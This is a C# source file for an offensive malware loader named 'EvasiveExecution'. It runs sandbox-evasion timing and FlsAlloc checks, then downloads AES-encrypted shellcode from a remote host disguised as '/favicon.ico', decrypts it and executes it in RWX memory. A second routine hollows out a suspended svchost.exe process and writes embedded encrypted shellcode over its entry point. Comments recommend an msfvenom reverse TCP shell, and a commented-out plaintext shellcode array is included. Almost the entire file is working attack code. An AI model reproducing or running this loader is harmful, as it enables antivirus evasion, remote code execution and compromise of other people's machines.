using System;
using System.IO;
using System.Management.Automation.Host;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using static Execution.Extensions.WinNative;

namespace Execution.Func
{
    public class EvasiveExecution
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
          IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern UInt32 FlsAlloc(IntPtr lpCallback);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        static byte[] Unlock(byte[] locked, byte[] key, byte[] iv)
        {
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = iv;

                ICryptoTransform unlocker = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                byte[] unlocked;

                using (MemoryStream msDecrypt = new MemoryStream(locked))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, unlocker, CryptoStreamMode.Read))
                    {
                        using (MemoryStream msPlain = new MemoryStream())
                        {
                            csDecrypt.CopyTo(msPlain);
                            unlocked = msPlain.ToArray();
                        }
                    }
                }

                return unlocked;
            }
        }

        public static async Task Prepare(string host)
        {
            byte[] key = new byte[] {
0x1e,0xf3,0xac,0x74,0x78,0xcb,0x6b,0xf0,0xd0,0x6d,0x79,0x32,
0x4a,0x92,0x29,0xc4,0xe8,0xcc,0xb0,0x91,0x3c,0x90,0x39,0xd0,
0xeb,0xb1,0x1c,0x38,0xec,0xe7,0x08,0x9c };
            byte[] iv = new byte[] {
0x7c,0xf8,0x30,0x9e,0x1f,0x99,0x0e,0xc6,0xec,0x83,0x35,0x00,
0x90,0x12,0xa3,0x54 };

            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            UInt32 result = FlsAlloc(IntPtr.Zero);
            if (result == 0xFFFFFFFF)
            {
                return;
            }
            string remoteResource = $"http://{host}/favicon.ico";
            string fileContent = await DownloadFileAsync(remoteResource);
            Console.WriteLine($"starting download {remoteResource}");
            //var bytes_filecont = Encoding.UTF8.GetBytes(fileContent);
            byte[] fBt = ConvertHexStringToByteArray(fileContent);
            byte[] unlocked = Unlock(fBt, key, iv);

            TraditionalExec(unlocked);
        }

        public static void TraditionalExec(byte[] unlocked)
        {
            Console.WriteLine("Entering TraditionalExec");
            int size = unlocked.Length;
            uint sizeUint = (uint)size;

            IntPtr addr = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, sizeUint, 0x3000, 0x40, 0);
            Marshal.Copy(unlocked, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }

        public static void ProcessHollowingExec()
        {
            Console.WriteLine("entering proc hollow");
            // process hollow must be executed with small shellcode
            // use msfvenom simple reverse tcp and then proceed with more complex stuff
            byte[] buf = {0xf3,0xb0,0x73,0x15,0x44,0x3a,0xbc,0xde,0xab,0xf6,0x6b,0xcd,
            0x36,0xda,0x83,0x7f,0xc6,0x17,0x47,0xc1,0xb5,0x78,0xbb,0x6c,
            0x7b,0xa2,0x91,0xa0,0x1e,0xed,0xd2,0x00,0x00,0xcf,0x4e,0x65,
            0x83,0xf8,0x50,0x0e,0x56,0x60,0xb5,0x0a,0x7a,0x61,0xd3,0x5f,
            0xe8,0x43,0x56,0x22,0xd9,0x56,0x44,0x38,0x76,0x5e,0x95,0xb8,
            0x6b,0xd0,0x44,0x72,0xb1,0xdb,0x26,0xf2,0x70,0xa2,0x6b,0x88,
            0xc7,0xb9,0x87,0x50,0xcf,0xf7,0x60,0xf7,0x86,0x72,0xa9,0x5f,
            0x8b,0xc5,0xb2,0x30,0x31,0x7d,0x1a,0x88,0x20,0x25,0xd7,0x24,
            0x8e,0xc0,0x08,0x18,0xd1,0xfc,0x56,0xed,0xdd,0x35,0xf1,0xe3,
            0xf9,0x59,0x66,0xcf,0xa2,0xc2,0xcd,0x49,0xe0,0x65,0x44,0xa0,
            0xe1,0xf7,0x2f,0xf7,0x83,0xcb,0x13,0x46,0x5d,0xc9,0x56,0x9f,
            0xe8,0x4c,0xd0,0x99,0x53,0x27,0x09,0x26,0xf4,0xec,0xdb,0x5b,
            0x24,0x31,0x9f,0x44,0x1b,0x0d,0x33,0x96,0x41,0x4d,0xd4,0x47,
            0x7b,0xcc,0x47,0x87,0x7b,0xb7,0x82,0xf9,0xbb,0xdc,0x63,0xe4,
            0x8c,0x4e,0x09,0x7c,0x64,0xfc,0x68,0x4b,0x8f,0x1f,0x9c,0xfe,
            0x49,0x50,0x0d,0x68,0xf3,0x05,0x33,0xd7,0xfd,0x8e,0xf2,0xf2,
            0x43,0x79,0x0b,0xa3,0x33,0xb9,0x7f,0x7a,0x35,0x01,0x6e,0x23,
            0xc1,0x88,0x1c,0x38,0x81,0x8f,0xb8,0x08,0xf0,0x2c,0x7f,0x62,
            0x02,0x6a,0x11,0x59,0x2d,0xd9,0xe9,0x71,0xac,0xc0,0x2b,0x9f,
            0xab,0x60,0x38,0x43,0x7a,0x3f,0xba,0x13,0x64,0x93,0x89,0x1c,
            0xa1,0x0d,0x87,0xcd,0x39,0x43,0x45,0xca,0x53,0x2f,0x7f,0xb4,
            0xd5,0x50,0x76,0x12,0xca,0x1d,0x34,0x5a,0xcf,0xc8,0xb1,0xcb,
            0x31,0x1e,0x35,0xa8,0x12,0xde,0x39,0x1a,0x3f,0x08,0xeb,0x8e,
            0x18,0x14,0x9e,0x96,0xc2,0x2a,0x96,0x8b,0x41,0x25,0xf2,0xb5,
            0xe9,0x53,0xd2,0xca,0xbe,0xcd,0xbb,0x6f,0x70,0x40,0xd2,0x9c,
            0xe5,0x00,0x41,0xaa,0x00,0x14,0x07,0xea,0x29,0xb6,0x5d,0xfa,
            0x61,0x24,0xf6,0x91,0xd0,0xca,0x6b,0x6d,0x01,0x4f,0x24,0x57,
            0x07,0x15,0xc6,0x53,0x5a,0x70,0x01,0x11,0xca,0x09,0x5f,0xcc,
            0x35,0xcc,0x5e,0xaf,0x80,0x53,0xdc,0xe6,0xa3,0xe8,0x01,0xe4,
            0x28,0x6c,0x17,0x76,0xd4,0x09,0x44,0xeb,0xcd,0xb6,0xd0,0x92,
            0x05,0x36,0xfb,0xe8,0xd0,0xf8,0x67,0x57,0x56,0x5b,0x0f,0x80,
            0x3a,0x0a,0x22,0x13,0xd6,0x51,0x15,0xb1,0xcb,0xd0,0x7f,0x75,
            0x81,0x74,0x6f,0xef,0x61,0xc7,0x1c,0x85,0x28,0x33,0xb2,0x20,
            0x7a,0xfd,0x0c,0x2e,0xc9,0x68,0xfb,0x42,0x05,0x3c,0xad,0xab,
            0x64,0xec,0x2e,0x4e,0x44,0x36,0xfe,0x50,0x70,0x36,0x0c,0xe5,
            0x71,0x3a,0xc5,0xa4,0x6f,0xdf,0xd2,0x86,0x4b,0x02,0x4d,0x0d,
            0x8b,0x14,0x12,0x73,0x35,0x98,0x1e,0xe2,0xc2,0xbe,0xa7,0x35,
            0x2c,0x9a,0x6e,0xa4,0xd3,0x3f,0xca,0x8b,0xd0,0xbe,0xad,0x8f,
            0x7e,0x7e,0xb9,0x42,0x2e,0x93,0xc8,0x51};

            byte[] key = new byte[] {
            0x79,0xb8,0x73,0x83,0xd8,0x63,0x37,0x48,0x0c,0x53,0x32,0xff,
            0x90,0x46,0x85,0x94,0xbd,0xbc,0x75,0x58,0xc3,0x88,0x33,0xfb,
            0xc1,0x41,0xb3,0x81,0x00,0x3a,0xd7,0x0e };
            byte[] iv = new byte[] {
            0x5e,0xf6,0x4c,0xdf,0x33,0xdb,0xdd,0xfa,0x33,0xf7,0x62,0x54,
            0x03,0x33,0x30,0xd4 };

            byte[] unlocked = Unlock(buf, key, iv);
            //byte[] unlocked = new byte[276] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
            //0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
            //0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
            //0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
            //0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
            //0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
            //0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
            //0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
            //0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
            //0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
            //0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
            //0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
            //0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
            //0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
            //0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
            //0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
            //0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
            //0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
            //0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,
            //0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,
            //0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,
            //0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,
            //0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
            //0x63,0x2e,0x65,0x78,0x65,0x00};

            STARTUPINFO processStartupInfo = new STARTUPINFO();
            PROCESS_INFORMATION svchostProcessInformation = new PROCESS_INFORMATION();
            PROCESS_BASIC_INFORMATION svchostBasicInformation = new PROCESS_BASIC_INFORMATION();
            IntPtr hProcess = IntPtr.Zero;
            uint tmp = 0;
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;

            bool res =  CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero,
                IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref processStartupInfo, out svchostProcessInformation);
            hProcess = svchostProcessInformation.hProcess;

            ZwQueryInformationProcess(hProcess, 0, ref svchostBasicInformation, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToImageBase = (IntPtr)((Int64)svchostBasicInformation.PebAddress + 0x10);

            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            byte[] peData = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, peData, peData.Length, out nRead);

            uint e_lfanew_offset = BitConverter.ToUInt32(peData, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(peData, (int)opthdr);

            // save svchost process entrypoint address pointer
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            // overwrite the content of the entrypoint address with our shellcode
            WriteProcessMemory(hProcess, addressOfEntryPoint, unlocked, unlocked.Length, out nRead);

            // Resume svchost process main thread
            ResumeThread(svchostProcessInformation.hThread);
        }

        static async Task<string> DownloadFileAsync(string url)
        {
            // Cria uma instância do HttpClient
            using (HttpClient client = new HttpClient())
            {
                string content = await client.GetStringAsync(url);
                return content;
            }
        }

        static byte[] ConvertHexStringToByteArray(string hexString)
        {
            // Remove quebras de linha, espaços em branco e outros caracteres indesejados
            hexString = Regex.Replace(hexString, @"\s+|\n|\r", "");

            // Separa os elementos pela vírgula
            string[] hexValues = hexString.Split(',');

            // Inicializa o array de bytes
            byte[] bytes = new byte[hexValues.Length];

            // Converte cada valor hexadecimal para byte
            for (int i = 0; i < hexValues.Length; i++)
            {
                if (hexValues[i].StartsWith("0x"))
                {
                    hexValues[i] = hexValues[i].Substring(2); // Remove o prefixo "0x"
                }
                bytes[i] = Convert.ToByte(hexValues[i], 16);
            }

            return bytes;
        }
    }
}